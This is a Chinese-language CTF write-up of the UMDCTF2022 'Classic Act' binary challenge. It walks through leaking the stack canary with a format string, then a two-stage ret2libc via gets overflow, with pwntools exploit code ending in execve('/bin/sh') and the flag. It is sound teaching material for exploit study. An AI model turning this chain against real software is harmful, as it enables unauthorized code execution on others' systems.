# UMDCTF2022 Classic Act Writeup

## 题目简述

程序先用 `gets` 读取姓名到 16 字节的 `buff1`，随后直接执行 `printf(buff1)`；第二次又用 `gets` 向 64 字节的 `buff2` 读入任意长度数据。附件中的官方利用脚本表明，目标是一个 amd64、Partial RELRO、启用 Canary 与 NX、关闭 PIE 的程序。

因此需要串联两个原语：先利用格式化字符串泄露栈 Canary，再利用第二个缓冲区溢出构造两阶段 ret2libc。

## 解题过程

姓名会被当成格式串：

```c
char buff1[16];
gets(buff1);
printf(buff1);
```

官方脚本使用 `%19$p`，第 19 个参数正好对应本次栈帧的 Canary：

```python
io.sendlineafter(b"Please enter your name!", b"%19$p")
canary = int(io.recvline_contains(b"0x").strip(), 16)
```

第二个缓冲区到 Canary 的距离是 `64 + 8 = 72` 字节。覆盖返回地址时必须把泄露值原样放回，否则函数返回前的栈保护检查会终止进程。第一阶段 ROP 调用 `puts(puts@got)` 泄露 libc 地址，再返回 `main` 获得第二次输入机会：

```python
rop1 = ROP(exe)
rop1.puts(exe.got["puts"])
rop1.call(exe.symbols["main"])

stage1 = flat(
    b"A" * 72,
    canary,
    b"B" * 8,
    rop1.chain(),
)
io.sendlineafter(b"What would you like to do today?", stage1)

leak = u64(io.recvline().strip().ljust(8, b"\x00"))
libc.address = leak - libc.sym["puts"]
```

题目同时提供了远端使用的 `libc.so.6`，所以泄露 `puts` 后可以准确计算 libc 基址。第二阶段在 libc 中寻找 `/bin/sh`，构造 `execve("/bin/sh", 0, 0)`：

```python
rop2 = ROP([exe, libc])
binsh = next(libc.search(b"/bin/sh\x00"))
rop2.execve(binsh, 0, 0)

stage2 = flat(
    b"A" * 72,
    canary,
    b"B" * 8,
    rop2.chain(),
)

io.sendlineafter(b"Please enter your name!", b"again")
io.sendlineafter(b"What would you like to do today?", stage2)
io.sendline(b"cat flag.txt")
```

得到：

```text
UMDCTF{H3r3_W3_G0_AgAIn_an0thEr_RET2LIBC}
```

## 方法总结

这是一条典型的“信息泄露后再控制流劫持”链。Canary 会阻止直接栈溢出，但同一函数中的格式化字符串先暴露了它；NX 阻止栈上执行代码，却不妨碍复用程序和 libc 中的现有代码。第一阶段只负责定位 libc，返回 `main` 后再完成第二阶段，能显著降低单条 ROP 链的复杂度。
